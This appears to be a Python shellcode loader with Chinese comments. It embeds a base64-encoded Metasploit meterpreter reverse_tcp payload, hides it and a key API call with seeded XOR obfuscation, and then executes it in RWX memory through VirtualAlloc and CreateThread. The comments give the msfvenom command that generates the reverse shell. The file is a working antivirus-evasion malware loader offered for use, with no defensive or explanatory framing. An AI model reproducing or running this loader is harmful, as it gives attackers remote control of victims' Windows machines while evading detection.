import base64
import random
import ctypes

def decode(shell_code,keys):
    shell_code_base64 = ''   #初始化shell_code
    random.seed(keys)   #设置随机种子,指定种子为keys
    code = shell_code.split(',')    #对shellcode处理，以逗号为分隔符输出数组
    for item in code:    #遍历
        item = int(item)
        shell_code_base64 += chr(item ^ random.randint(0, 255))   #seed相同，对应的每个随机数也是固定的
    return shell_code_base64     #返回字符串,为原来的shellcode内容

def fs_decode(funcs):
    fs_keys = '123'   #设置随机数种子
    func_codes = ''   #初始化
    random.seed(fs_keys)
    func_code = funcs.split(',')   #对传入的字符串以逗号为分割，返回数组
    for item in func_code:    #遍历
        item = int(item)
        func_codes += chr(item ^ random.randint(0, 255))    #异或运算
    return func_codes    #返回字符串

def encode(ShellCode,keys):
    random.seed(keys)  #设置随机种子
    ShellCode_2 = ''   #初始化
    for item in ShellCode:    #遍历
        #获取每个字符的ascii值并与0-255中一个数进行异或运算(相同为0，不同则为1)
        ShellCode_2 += str(ord(item) ^ random.randint(0, 255)) + ','
    ShellCode_2 = ShellCode_2.strip(',')   #得到一串字符串，例如’75,211,...‘,strip(',')移除头尾的逗号
    return ShellCode_2  #返回字符串,加密完成


def run(shellcode):
    #调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
    #由于Pyhon在申请内存的时候默认是使用32位的，x86和x64的兼容性问题导致了内存不可写，如果系统是64位的，就要加上下面的语句
    #返回值类型为C 64位 unsigned int  范围0~4294967295(范围4字节)
    ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
    #分配内存，起始地址为0，区域大小为len(shellcode)个字节,分配类型为MEM_COMMIT(0x1000) 和 MEM_RESERVE(0x2000)，权限为PAGE_EXECUTE_READWRITE 该区域可以执行代码，应用程序可以读写该区域。
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
    #funcs为加密字符串，seed为123，解密方式为异或运算,除此之外，还可以使用其它加密（编码）方式对函数加密（编码）
    funcs = '70,208,133,111,226,123,113,146,231,30,133,20,54,203,71,77,230,234,182,55,207,108,203,231,232,79,137,160,182,180,203,54,84,167,78,235,21,203,131,209,183,25,202,144,179,84,168,137,158,181,33,136,154,102,166,98,8,179,139,242,251,26,1,178,19,125,22,209,56,51,119,41,229,118,164,182,74,178,157,53,248,183,48,58,66,179,109,168,30,182,106,60,119,170,147,57,73,4,41,221,62,148,2,9,60,188,167,47,194,232,35,141,240,193,78,169,122,86'
    #对funcs进行解密
    func = fs_decode(funcs)
    #执行被解密的函数，在RtlMoveMemory加上64位的类型：
    #ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
    exec(func)
    #创建进程调用CreateThread，将在主线程的基础上创建一个新的线程
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

if __name__ == '__main__':
    #msf生成base64编码过的shellcode,格式：
    #msfvenom -p /windows/x64/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port]  --encrypt=base64 -f c
    #复制生成的shellcode
    ShellCode = '''"\x2f\x45\x69\x44\x35\x50\x44\x6f\x7a\x41\x41\x41\x41\x45"
"\x46\x52\x51\x56\x42\x53\x53\x44\x48\x53\x55\x56\x5a\x6c"
"\x53\x49\x74\x53\x59\x45\x69\x4c\x55\x68\x68\x49\x69\x31"
"\x49\x67\x53\x41\x2b\x33\x53\x6b\x70\x49\x69\x33\x4a\x51"
"\x54\x54\x48\x4a\x53\x44\x48\x41\x72\x44\x78\x68\x66\x41"
"\x49\x73\x49\x45\x48\x42\x79\x51\x31\x42\x41\x63\x48\x69"
"\x37\x56\x4a\x49\x69\x31\x49\x67\x51\x56\x47\x4c\x51\x6a"
"\x78\x49\x41\x64\x42\x6d\x67\x58\x67\x59\x43\x77\x49\x50"
"\x68\x58\x49\x41\x41\x41\x43\x4c\x67\x49\x67\x41\x41\x41"
"\x42\x49\x68\x63\x42\x30\x5a\x30\x67\x42\x30\x46\x43\x4c"
"\x53\x42\x68\x45\x69\x30\x41\x67\x53\x51\x48\x51\x34\x31"
"\x5a\x49\x2f\x38\x6c\x4e\x4d\x63\x6c\x42\x69\x7a\x53\x49"
"\x53\x41\x48\x57\x53\x44\x48\x41\x51\x63\x48\x4a\x44\x61"
"\x78\x42\x41\x63\x45\x34\x34\x48\x58\x78\x54\x41\x4e\x4d"
"\x4a\x41\x68\x46\x4f\x64\x46\x31\x32\x46\x68\x45\x69\x30"
"\x41\x6b\x53\x51\x48\x51\x5a\x6b\x47\x4c\x44\x45\x68\x45"
"\x69\x30\x41\x63\x53\x51\x48\x51\x51\x59\x73\x45\x69\x45"
"\x46\x59\x51\x56\x68\x49\x41\x64\x42\x65\x57\x56\x70\x42"
"\x57\x45\x46\x5a\x51\x56\x70\x49\x67\x2b\x77\x67\x51\x56"
"\x4c\x2f\x34\x46\x68\x42\x57\x56\x70\x49\x69\x78\x4c\x70"
"\x53\x2f\x2f\x2f\x2f\x31\x31\x4a\x76\x6e\x64\x7a\x4d\x6c"
"\x38\x7a\x4d\x67\x41\x41\x51\x56\x5a\x4a\x69\x65\x5a\x49"
"\x67\x65\x79\x67\x41\x51\x41\x41\x53\x59\x6e\x6c\x53\x62"
"\x77\x43\x41\x42\x46\x63\x72\x42\x51\x4d\x42\x55\x46\x55"
"\x53\x59\x6e\x6b\x54\x49\x6e\x78\x51\x62\x70\x4d\x64\x79"
"\x59\x48\x2f\x39\x56\x4d\x69\x65\x70\x6f\x41\x51\x45\x41"
"\x41\x46\x6c\x42\x75\x69\x6d\x41\x61\x77\x44\x2f\x31\x57"
"\x6f\x4b\x51\x56\x35\x51\x55\x45\x30\x78\x79\x55\x30\x78"
"\x77\x45\x6a\x2f\x77\x45\x69\x4a\x77\x6b\x6a\x2f\x77\x45"
"\x69\x4a\x77\x55\x47\x36\x36\x67\x2f\x66\x34\x50\x2f\x56"
"\x53\x49\x6e\x48\x61\x68\x42\x42\x57\x45\x79\x4a\x34\x6b"
"\x69\x4a\x2b\x55\x47\x36\x6d\x61\x56\x30\x59\x66\x2f\x56"
"\x68\x63\x42\x30\x43\x6b\x6e\x2f\x7a\x6e\x58\x6c\x36\x4a"
"\x4d\x41\x41\x41\x42\x49\x67\x2b\x77\x51\x53\x49\x6e\x69"
"\x54\x54\x48\x4a\x61\x67\x52\x42\x57\x45\x69\x4a\x2b\x55"
"\x47\x36\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67\x2f\x67\x41"
"\x66\x6c\x56\x49\x67\x38\x51\x67\x58\x6f\x6e\x32\x61\x6b"
"\x42\x42\x57\x57\x67\x41\x45\x41\x41\x41\x51\x56\x68\x49"
"\x69\x66\x4a\x49\x4d\x63\x6c\x42\x75\x6c\x69\x6b\x55\x2b"
"\x58\x2f\x31\x55\x69\x4a\x77\x30\x6d\x4a\x78\x30\x30\x78"
"\x79\x55\x6d\x4a\x38\x45\x69\x4a\x32\x6b\x69\x4a\x2b\x55"
"\x47\x36\x41\x74\x6e\x49\x58\x2f\x2f\x56\x67\x2f\x67\x41"
"\x66\x53\x68\x59\x51\x56\x64\x5a\x61\x41\x42\x41\x41\x41"
"\x42\x42\x57\x47\x6f\x41\x57\x6b\x47\x36\x43\x79\x38\x50"
"\x4d\x50\x2f\x56\x56\x31\x6c\x42\x75\x6e\x56\x75\x54\x57"
"\x48\x2f\x31\x55\x6e\x2f\x7a\x75\x6b\x38\x2f\x2f\x2f\x2f"
"\x53\x41\x48\x44\x53\x43\x6e\x47\x53\x49\x58\x32\x64\x62"
"\x52\x42\x2f\x2b\x64\x59\x61\x67\x42\x5a\x53\x63\x66\x43"
"\x38\x4c\x57\x69\x56\x76\x2f\x56"'''
    keys = 'Axx8'     #keys用于加密与解密，可以修改
    #将双引号去掉，将换行符去掉,并进行编码，seed为keys
    shell_code = encode(ShellCode.replace('"', '').replace('\n', ''),keys)
    #上一步得到的shell_code为字符串，接下来再对shellcode进行解密
    shellcode = decode(shell_code,keys)

    #由于shellcode经过base64编码，所以这里需要解码一下，返回byte字符串，如b'\xfcH\x83\xe4...'
    shellcode = base64.b64decode(shellcode)
    #run shellcode
    run(shellcode)